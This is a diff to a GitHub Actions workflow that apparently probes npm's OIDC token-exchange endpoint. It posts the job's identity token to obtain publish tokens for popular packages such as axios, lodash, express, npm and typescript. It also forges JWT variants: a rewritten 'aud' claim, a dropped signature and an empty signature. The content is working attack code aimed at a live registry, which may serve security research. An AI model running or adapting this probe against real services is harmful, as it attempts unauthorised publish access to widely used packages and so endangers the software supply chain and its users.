@@ -81,8 +81,7 @@ jobs:
         run: |
           set -uo pipefail
           TOKEN=$(cat /tmp/id_token)
-          while IFS= read -r P; do
-            [ -z "$P" ] && continue
+          for P in "${{ inputs.package }}" axios lodash express npm prettier typescript semver chalk; do
             ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$P")
             CODE=$(curl -sS -o /tmp/r.json -w '%{http_code}' -X POST \
               -H "Authorization: Bearer ${TOKEN}" \
@@ -90,15 +89,7 @@ jobs:
               "https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/${ENC}")
             printf 'EXCH %-45s HTTP %s  %s\n' "$P" "$CODE" "$(head -c 200 /tmp/r.json)"
             sleep 2
-          done <<'PKGS'
-${{ inputs.package }}
-axios
-lodash
-express
-npm
-@sigstore/cli
-this-package-does-not-exist-zzz999
-PKGS
+          done
 
       - name: Trust list endpoints (auth as ourselves, expect auth error)
         continue-on-error: true
@@ -134,14 +125,15 @@ PKGS
           set -uo pipefail
           TOKEN=$(cat /tmp/id_token)
           H=$(cut -d. -f1 /tmp/id_token); P=$(cut -d. -f2 /tmp/id_token); S=$(cut -d. -f3 /tmp/id_token)
-          # 1) swap in a forged 'aud'
-          NEWP=$(python3 -c "
-import base64,json,sys
-p=sys.argv[1]; p+='='*(-len(p)%4)
-d=json.loads(base64.urlsafe_b64decode(p))
-d['aud']='npm:registry.npmjs.com'
-print(base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).decode().rstrip('='))
-" "$P")
+          printf '%s\n' \
+            'import base64, json, sys' \
+            'p = sys.argv[1]' \
+            'p += "=" * (-len(p) % 4)' \
+            'd = json.loads(base64.urlsafe_b64decode(p))' \
+            'd["aud"] = "npm:registry.npmjs.com"' \
+            'print(base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).decode().rstrip("="))' \
+            > /tmp/mut.py
+          NEWP=$(python3 /tmp/mut.py "$P")
           for LBL in aud_mutated sig_dropped empty_sig; do
             case $LBL in
               aud_mutated) T="$H.$NEWP.$S";;
